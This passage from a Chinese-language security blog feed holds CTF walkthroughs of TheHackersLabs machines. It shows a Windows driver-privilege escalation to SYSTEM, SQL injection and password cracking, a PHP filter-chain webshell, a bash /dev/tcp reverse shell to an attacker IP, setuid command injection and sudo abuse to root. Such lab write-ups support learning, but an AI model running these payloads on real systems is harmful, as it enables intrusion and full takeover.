'TurkisArrusPuchuchuSiu1'\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)\n```\n\n`Chivas Regal` ç”¨æˆ·å¯ä»¥è¯»å– `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Chivas Regal\\Desktop> type user.txt\nbb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## SeLoadDriverPrivilege\n\n`whoami` ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image6.png)\n\nèƒ½æ‰¾åˆ° `SeLoadDriverPrivilege` ï¼Œè¿™æ˜¯é»˜è®¤çš„è´¦æˆ·ä¸å­˜åœ¨çš„æƒé™\n\nèƒ½æ‰¾ä¸€äº›å­˜å‚¨åº“ï¼š https://github.com/k4sth4/SeLoadDriverPrivilege\n\n```bash\n*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe LOAD C:\\temp\\Capcom.sys\n[*] Service Name: uciifgxe\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-3046175042-3013395696-775018414-1108\\???????????????????\nNTSTATUS: 00000000, WinError: 0\n\n*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe EXPLOIT whoami\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obtained as 0000000000000064\n[*] Shellcode was placed at 0000013180FE0008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] Command Executed\nnt authority\\system\n```\n\næˆåŠŸæ‹¿åˆ° `system` ç”¨æˆ·æƒé™\n\nè¿™é‡Œå¯ä»¥ä½¿ç”¨ `msf` æ¥å¼¹ï¼Œä¸å¤šèµ˜è¿°â€¦.\n\næœ€åè¿è¡Œæ¶æ„ `exe` å³å¯å¼¹å›æ¥\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image7.png)\n\n```bash\nC:\\Users\\Administrador\\Desktop>type root.txt\ntype root.txt\ncfa7cb1cc20e26c0428f9222d44c76a0  -\n```\n\n## æ€»ç»“\n\næ‰“å°æœºé‚£é‡Œæœ‰ç‚¹æ²¡æƒ³åˆ°ï¼Œè¦çœ‹æè¿°\n\næœ€å SeLoadDriverPrivilege å¡äº†ä¸€ä¸‹ï¼Œ`payload`éœ€è¦æ”¹ä¸€ä¸‹",
            "url": "https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharÃ¡n",
            "title": "TheHackersLabs - PacharÃ¡n",
            "summary": "PacharÃ¡n https://labs.thehackerslabs.com/machine/61 Recon PortScan æšä¸¾ SMB åŒ¿åæµ‹è¯• å¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ· ç›´æ¥ç”¨nxcå…¨éƒ¨æ‹‰ä¸‹æ¥ å¾—åˆ°ä¸€ä¸ª txt æ–‡ä»¶ Orujo.txt åƒæ˜¯ä¸€ä¸ªå‡­æ®ï¼Œæµ‹è¯•ä¸€ä¸‹ æˆåŠŸæ‹¿åˆ° orujo çš„å‡­æ® åŸŸ...",
            "date_modified": "2025-07-27T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "SeLoadDriverPrivilege",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I",
            "content_html": "\n# Back To The Future I\n\n> https://labs.thehackerslabs.com/machine/119\n> \n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST\nNmap scan report for 192.168.56.94\nHost is up (0.00056s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.52 seconds\n```\n\n```bash\nâœ  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST\nNmap scan report for 192.168.56.94\nHost is up (0.00051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)\n|_  256 fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://hillvalley.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.51 ms 192.168.56.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.68 seconds\n```\n\n### æšä¸¾\n\n`FTP` åŒ¿å\n\n```bash\nâœ  Back_To_The_Future_I ftp 192.168.56.94\nConnected to 192.168.56.94.\n220 (vsFTPd 3.0.3)\nName (192.168.56.94:root): anonymous\n530 Permission denied.\nftp: Login failed\n```\n\n`HTTP` æœåŠ¡\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png)\n\næŸ¥çœ‹æºç èƒ½æ‰¾åˆ°\n\n```bash\n  <!-- Â¡El reloj de la torre no tiene nada que ver! Â¿O sÃ­? -->\n  <!-- å¡”é’Ÿè·Ÿè¿™äº‹å„¿ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ï¼æˆ–è€…è¯´ï¼Œæœ‰å…³ç³»ï¼Ÿ-->\n```\n\nç›®å½•çˆ†ç ´\n\n```bash\nâœ  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a\nsp,php,txt,zip                                                                                  \n                                                                                                \n ___  ___  __   __     __      __         __   ___                           \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                                                                                               \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                                                                                              \nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0                                                                                                                                              \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                                                                                                              \n ğŸ¯  Target Url            â”‚ http://hillvalley.thl/\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css\n200      GET       69l      176w     2948c http://hillvalley.thl/index.php\n200      GET       69l      176w     2948c http://hillvalley.thl/\n200      GET        3l       28w      240c http://hillvalley.thl/about.php\n302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php\n301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/\n301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/\n200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png\n301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/\n200      GET       23l       61w      838c http://hillvalley.thl/js/index.js\n302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php\n200      GET        0l        0w        0c http://hillvalley.thl/config.php\n200      GET        6l       25w      216c http://hillvalley.thl/logs.php\n200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png\n200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php\n[####################] - 79s  1038210/1038210 0s      found:15      errors:0      \n[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ \n[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)\n```\n\n`about.php`\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png)\n\n`logs.php`\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png)\n\n`time_machine.php`\n\n ï¼ŸEI Psy Kongroo ~\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png)\n\næ²¡æ‰¾åˆ°ä¿¡æ¯ï¼Œå°è¯•çˆ†ç ´ç™»å½•æ¡†ï¼Œä¹Ÿæ˜¯ä¸æˆåŠŸ\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png)\n\næµ‹è¯•ä¸€ä¸‹ç™»å½•æ¡†\n\nå‘ç°å­˜åœ¨ `SQL` æ³¨å…¥\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png)\n\n## SQL æ³¨å…¥\n\nç›´æ¥ä¸Š `SQLmap` ï¼Œæµ‹è¯•å‡ºæ¥ å»¶æ—¶æ³¨å…¥\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png)\n\nå°†æ•°æ®éƒ½çˆ†å‡ºæ¥\n\n```bash\ncurrent user: 'marty@localhost'\ncurrent database: 'hillvalley'\n\nDatabase: hillvalley\n[1 table]\n+-------+\n| users |\n+-------+\n\n+----+--------------------------------------------------------------+----------+\n| id | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n```\n\nå°†å¯†ç è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt hash                 \nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nandromeda        (?)     \nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\nå¾—åˆ°ä¸€ä¸ªè´¦æˆ· `marty`:`andromeda`\n\n## æ–‡ä»¶åŒ…å«\n\nç™»å½•è¿›å»åå°\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png)\n\nå¾—åˆ°ä¸€äº›å…³äºå¯†ç ä¿¡æ¯\n\n```bash\næˆ‘å®æ–½äº†ä¸€é¡¹åŸºæœ¬çš„å®‰å…¨æªæ–½æ¥ä¿æŠ¤å…³é”®çš„é¡¹ç›®æ–‡ä»¶ã€‚\næˆ‘ä½¿ç”¨äº†ä¸æˆ‘çš„æ—¶å…‰æœºå’Œç¬¬ä¸€æ¬¡è·³è·ƒçš„æ—¥æœŸç›¸å…³çš„å¯†ç ã€‚\n\né©¬è’‚æ°¸è¿œä¸ä¼šå¿˜è®°é‚£ä¸€å¤©ã€‚\n\nâ€”â€”åŒ»ç”Ÿ\n```\n\næˆ‘ä»¬è¿˜æ³¨æ„åˆ°`URL`æ˜¯è²Œä¼¼æ˜¯åŒ…å«æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹åŒ…å«ä¸€ä¸‹åˆ«çš„æ–‡ä»¶\n\næˆåŠŸå°† `/etc/passwd` åŒ…å«å‡ºæ¥\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png)\n\nå¯ä»¥ç›´æ¥å°† `user.txt` ç»™åŒ…å«å‡ºæ¥\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png)\n\nä½†æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‹¿åˆ° `shell` \n\næµ‹è¯•ä¼ªåè®®æ˜¯å¦å¯ä»¥ä½¿ç”¨\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png)\n\næˆ‘ä»¬å°è¯•é€šè¿‡ `php://filter/write` æ¥å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸ\n\n```bash\nphp://filter/write=convert.base64-decode/resource=shell.php&data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=\n```\n\né€šè¿‡ï¼šhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\n\nèƒ½åˆ°ä¸€ä¸ªå·¥å…· **PHP filter chain generator**ï¼šhttps://github.com/synacktiv/php_filter_chain_generator\n\nç”Ÿæˆ `payload`ï¼š\n\n```bash\npython3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '\n```\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png)\n\nç”Ÿæˆåå¼¹ `shell` çš„ä»£ç ï¼š\n\n```bash\n\tpython3 php_filter_chain_generator.py --chain '<?php eval(system($_GET[\"x\"])); ?>  '\n```\n\næµ‹è¯•ä»£ç æ‰§è¡Œ\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'\n```\n\næ‹¿åˆ°ç«‹è¶³ç‚¹\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png)\n\n## To Marty\n\næŸ¥çœ‹é…ç½®æ–‡ä»¶\n\n```bash\nwww-data@hillvalley:/var/www/project/app$ cat config.php \n<?php\n$host = \"localhost\";\n$user = \"marty\";\n$pass = \"t1m3travel\";\n$db = \"hillvalley\";\n\n$conn = mysqli_connect($host, $user, $pass, $db);\nif (!$conn) {\n    die(\"Connection failed: \" . mysqli_connect_error());\n}\n?>\n```\n\næ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå› ä¸ºç”¨æˆ·åæ˜¯ `marty` ï¼Œæˆ‘ä»¬é¡ºä¾¿ç¢°æ’ä¸€ä¸‹å¯†ç \n\n```bash\nwww-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ \n```\n\næˆåŠŸåˆ‡æ¢åˆ°ç”¨æˆ·`Marty`\n\næˆ‘ä»¬å†™å…¥ `SSH` å…¬é’¥ï¼Œä½¿ç”¨å…¬é’¥è¿›è¡Œç™»å½•\n\n## To docbrown\n\nå®¶ç›®å½•ä¸‹çš„éšè—æ–‡ä»¶\n\n```bash\nmarty@hillvalley:~$ cat .flux_notes \nTiempos inestables... aÃºn necesito arreglar el runner para la prÃ³xima prueba.\n```\n\n> æ—¶é—´ä¸ç¨³å®š...ä»ç„¶éœ€è¦ä¿®å¤è¿è¡Œå™¨ä»¥è¿›è¡Œä¸‹ä¸€æ¬¡æµ‹è¯•ã€‚\n> \n\nèƒ½ç›´æ¥çœ‹`docbrown`çš„å®¶ç›®å½•\n\n```bash\nmarty@hillvalley:/home/docbrown$ ls -al\ntotal 88\ndrwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .\ndrwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..\nlrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null\n-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout\n-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc\ndrwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache\ndrwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config\n-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face\nlrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face\n-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:08 .local\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla\n-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile\n-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos\ndrwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs\n```\n\n`.flux_hint`\n\n```bash\nmarty@hillvalley:/home/docbrown$ cat .flux_hint \nHe estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\n```\n\n> æˆ‘ä¸€ç›´åœ¨ç ”ç©¶ä¸€ç§åŒæ­¥ç³»ç»Ÿè„šæœ¬çš„æ–°æ–¹æ³•ã€‚åˆ†åˆ†ç§’ç§’â€¦â€¦ç²¾å‡†æ— è¯¯ã€‚\n> \n\næåˆ°äº†åŒæ­¥ç³»ç»Ÿè„šæœ¬ï¼Œæˆ‘ä»¬ä¸Š`pspy`çœ‹çœ‹\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png)\n\næ³¨æ„åˆ° **`/usr/local/bin/flux_admin.sh`**\n\nä½†æ˜¯æ ¹ç›®å½•ä¸­ä¹Ÿæ˜¯æ²¡æœ‰\n\n```bash\nmarty@hillvalley:/usr/local/bin$ ls -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n```\n\nä¸Š `linpeas.sh` çœ‹çœ‹\n\nå¯ä»¥æ³¨æ„åˆ°å¦‚ä¸‹ä¿¡æ¯\n\n```bash\nFiles with capabilities (limited to 50): \n/usr/local/bin/backup_runner cap_setuid=ep \n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/ping cap_net_raw=ep \n```\n\nå½“ç¨‹åº `backup_runner` è¿è¡Œæ—¶ä¸€äº›æ‹¥æœ‰ `setuid` æƒé™ï¼Œå¯ä»¥ä»¥å…¶ä»–ç”¨æˆ·æƒé™è¿è¡Œ\n\næˆ‘ä»¬å°†å…¶æ‹‰å‡ºå»åˆ†æä¸€ä¸‹\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+10h] [rbp-110h] BYREF\n  const char *v5; // [rsp+118h] [rbp-8h]\n\n  if ( argc != 2 )\n    usage(argc, argv, envp);\n  v5 = argv[1];\n  snprintf(s, 0x100uLL, \"tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\", v5);\n  setuid(0x3E8u);\n  system(s);\n  return 0;\n}\n```\n\nå…¶ä¸­çš„ `setuid(0x3E8u);` ä¹Ÿå°±æ˜¯ `1000` ï¼Œè€Œ `1000` åˆšå¥½æ˜¯ `docbrown`\n\nå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤æ˜¯ `tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs`\n\nè¯¥ç¨‹åºå­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå› ä¸º `v5` å¹¶æ²¡æœ‰è¢«å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥è¢«è°ƒç”¨\n\n```bash\n\"; id ;\"\n```\n\n```bash\nmarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \"; id ;\"\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\nuid=1000(docbrown) gid=1001(marty) groups=1001(marty)\nsh: 1: -backup.tar.gz: not found\n```\n\nè·å¾— `docbrown` çš„ `shell`\n\n```bash\nmarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \"; /bin/bash -p ;\"\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\ndocbrown@hillvalley:/home/docbrown$ \n```\n\n## To Root\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```bash\ndocbrown@hillvalley:/home/docbrown$ sudo -l\nMatching Defaults entries for docbrown on hillvaley:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n```\n\næˆ‘ä»¬å°è¯•è¿è¡Œä¸€ä¸‹\n\n```bash\n[FLUX] No existe el archivo /tmp/sync: No such file or directory\n```\n\n```bash\ndocbrown@hillvalley:/tmp$ vim sync\ndocbrown@hillvalley:/tmp$ sudo time_daemon\n[88MPH] SincronizaciÃ³n completada. Listo para viajar.\n```\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png)\n\nè²Œä¼¼æ˜¯åˆ›å»ºå®šæ—¶ä»»åŠ¡\n\næˆ‘ä»¬å°†ææƒè¯­å¥å†™å…¥ `/tmp/sync` å¹¶è¿è¡Œ `time_deamon`\n\n```bash\ndocbrown@hillvalley:/tmp$ echo \"chmod +s /bin/bash\" > /tmp/sync\n\ndocbrown@hillvalley:/usr/local/bin$ sudo /usr/local/bin/time_daemon\n[88MPH] SincronizaciÃ³n completada. Listo para viajar.\n```\n\nç­‰åœ¨ `pspy` æ˜¾ç¤ºè¿è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œå†æŸ¥çœ‹\n\n```bash\ndocbrown@hillvalley:/usr/local/bin$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n```\n\næœ€åè¯»å– `root.txt`\n\n```bash\nbash-5.2# cat notes.txt \nÂ¡Felicidades, viajero del tiempo!\n\nLograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstÃ¡culos temporales y... \nÂ¡volviste al futuro con todos los flags en el DeLorean!\n\nDoc estarÃ­a orgulloso, y Martyâ€¦ bueno, seguro todavÃ­a estÃ¡ en problemas con Biff. \nPero vosâ€¦ vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.\n\n    â€œEl futuro no estÃ¡ escrito, todavÃ­a. El tuyo serÃ¡ exactamente como lo hagas.â€\n    â€” Doc Emmett Brown\n\nGracias por jugar este CTF inspirado en una de las mejores trilogÃ­as de todos los tiempos. \n\nSi disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los prÃ³ximos desafÃ­os que se vienen en la saga.\n\nbash-5.2# cat root.txt \nFLAGxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\néš¾åº¦è¿˜å¥½ï¼Œå°±æ˜¯æœ‰äº›åœ°æ–¹ä¼šå¡ä½",
            "url": "https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I",
            "title": "TheHackersLabs - Back To The Future I",
            "summary": "Back To The Future I https://labs.thehackerslabs.com/machine/119 Recon PortScan æšä¸¾ FTP åŒ¿å HTTP æœåŠ¡ æŸ¥çœ‹æºç èƒ½æ‰¾åˆ° ç›®å½•çˆ†ç ´ about.php logs.php time machine.php ï¼ŸEI...",
            "date_modified": "2025-07-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "SQLInjection",
                "FileInclude",
                "CommandInjection"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption",
            "content_html": "\n# NodeCeption\n\n> https://labs.thehackerslabs.com/machine/118\n> \n\n![image.png](/post-images/TheHackersLabsNodeCeption/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  NodeCeption nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:09 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00034s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:BE:8A:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.88\nHost is up (0.00058s latency).\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds\n```\n\n```bash\nâœ  NodeCeption nmap -sT -min-rate 10000 -p- 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:11 CST\nNmap scan report for 192.168.56.88\nHost is up (0.00070s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5678/tcp open  rrac\n8765/tcp open  ultraseek-http\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.73 seconds\n```\n\n```bash\nâœ  NodeCeption nmap -sT -A -p 22,5678,8765 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:12 CST\nNmap scan report for 192.168.56.88\nHost is up (0.00053s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)\n|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)\n5678/tcp open  rrac?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=86400\n|     Last-Modified: Fri, 25 Jul 2025 12:09:30 GMT\n|     ETag: 